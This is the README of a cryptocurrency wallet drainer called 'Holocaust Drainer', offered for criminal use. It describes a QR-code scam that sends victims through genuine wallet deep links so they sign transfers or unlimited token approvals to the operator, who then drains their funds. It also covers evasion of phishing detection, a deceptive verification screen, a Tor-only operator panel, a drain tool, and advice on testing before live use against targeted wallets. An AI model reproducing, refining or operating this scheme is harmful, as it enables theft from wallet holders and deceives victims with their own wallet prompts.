# Holocaust Drainer

QR-code wallet drainer with deep-link delivery. The victim scans a normal-looking
payment QR; their own wallet opens through the vendor's own deeplink domains and
shows its own native prompt. No attacker domain, no drainer contract, no
phishing page in the classic sense.

## How it works (attack flow)

```
  operator panel (.onion)                static host (fresh HTTPS domain)
  ┌──────────────────────┐               ┌─────────────────────────┐
  │ login (scrypt+lock)  │  hop page     │  /p/<token>/index.html  │
  │ receiver addresses   │ ─upload─────► │  self-contained HTML    │
  │ QR generator         │               └───────────┬─────────────┘
  └─────────┬────────────┘                           │
            │ QR = https://<host>/p/<token>          ▼
            ▼                              victim's camera scans
     ┌────────────┐                        ▼
     │ fresh QR   │                 ┌─────────────────────────────┐
     │ every time │    phone scan   │ wallet's OWN deeplink domain │
     └────────────┘ ───────────────► metamask.app.link/send/…    │
                                     link.trustwallet.com/payment     │
                                     in-app dApp browser (approve)    │
                                     └───────────┬────────────────────┘
                                                 ▼
                              victim's own wallet shows its own prompt
                              pay:      USDT transfer, amount pre-filled
                              approve:  approve(operator EOA, MaxUint256)
                                                 │
                                                 ▼
                              ./drain pulls transferFrom at leisure
```

## Features

- **Deep-link abuse** — QR carries only the operator's static-host URL; all
  wallet handoff goes through `metamask.app.link`, `link.trustwallet.com`,
  `solana:` URIs (URL-based phishing detection has nothing to flag).
- **UX deception** — hop page renders a clean "Verifying payment capability"
  screen; the victim confirms a prompt generated by their own wallet, not a
  webpage. Optional $1/micro-amount illusion for pay mode.
- **Persistence** — approve mode executes the standard ERC-20
  `approve(spender, MaxUint256)` with the operator's plain EOA as spender.
  No drainer contract exists on-chain to fingerprint; drain later with
  `transferFrom` until the victim revokes.
- **Fresh QR lifecycle** — every generation mints a unique HMAC-signed token
  (stateless: server restarts/moves invalidate nothing); the panel UI enforces
  the receiver → new static domain → new QR workflow.
- **Multichain** — 8 EVM networks (Ethereum, Polygon, BSC, Arbitrum, OP, Base,
  Avalanche, Fantom) + Tron + Solana + XRP for pay mode; approve mode on all
  EVM chains.
- **Hardened panel** — Tor v3 onion only (binds 127.0.0.1), scrypt password
  hash, per-IP brute-force lockout with state-indistinguishable responses,
  no-JS templates, no victim data stored, no telemetry.
- **Drain tool** — `drain` signs and broadcasts EIP-155 `transferFrom`
  (proven against the canonical EIP-155 vector), zero-cost approvals
  harvested with a one-liner.

## Testing status — is testing required?

**Yes, before first live use.** The Go code is unit- and integration-verified
in this repo (all gates pass; see `functionality.md` for the per-component
record), but wallet deeplink behavior varies by wallet version and OS. Walk
through `verify.md` once per wallet you intend to target — no burner phone
required (desktop-extension + testnet + emulator paths included).
